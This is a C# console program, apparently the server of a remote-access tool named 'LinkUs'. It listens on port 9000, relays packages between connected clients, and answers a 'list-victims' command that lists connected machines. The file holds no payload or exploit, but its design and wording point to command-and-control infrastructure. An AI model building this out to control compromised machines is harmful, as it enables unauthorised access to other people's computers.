using System;
using System.Linq;
using System.Net;
using System.Text;
using LinkUs.Core;

namespace LinkUs
{
    class Program
    {
        static readonly UTF8Encoding Encoding = new UTF8Encoding();
        private static readonly Connector _connector = new Connector();

        static void Main(string[] args)
        {
            _connector.PackageReceived += ConnectorOnPackageReceived;
            _connector.ClientConnected+=ConnectorOnClientConnected;
            _connector.ClientDisconnected+=ConnectorOnClientDisconnected;
            _connector.Listen(new IPEndPoint(IPAddress.Any, 9000));
            Console.WriteLine("* Listening for clients...");
            while (Console.ReadLine() != "exit") ;
            Console.WriteLine("* Closing connections...");
            _connector.Close();
            Console.WriteLine("* Closed.");
        }

        // ----- Event callbacks
        private static void ConnectorOnClientConnected(ClientId clientId)
        {
            Console.WriteLine($"* {clientId} connected.");
            var package = new Package(ClientId.Server, clientId, Encoding.GetBytes("identification"));
            _connector.SendDataAsync(package);
        }
        private static void ConnectorOnClientDisconnected(ClientId clientId)
        {
            Console.WriteLine($"* {clientId} disconnected.");
        }
        private static void ConnectorOnPackageReceived(Package package)
        {
            Console.WriteLine(package);
            if (Equals(package.Destination, ClientId.Server)) {
                var commandLine = Encoding.GetString(package.Content);
                if (commandLine == "list-victims") {
                    var clients = _connector.GetClients();
                    var value = string.Join(Environment.NewLine, clients.Select(x => x.ToString()));
                    var packageResponse = package.CreateResponsePackage(Encoding.GetBytes(value));
                    _connector.SendDataAsync(packageResponse);
                }
                else {
                    var responsePackage = package.CreateResponsePackage(Encoding.GetBytes("Invalid command"));
                    _connector.SendDataAsync(responsePackage);
                }
            }
            else {
                _connector.SendDataAsync(package);
            }
        }
    }
}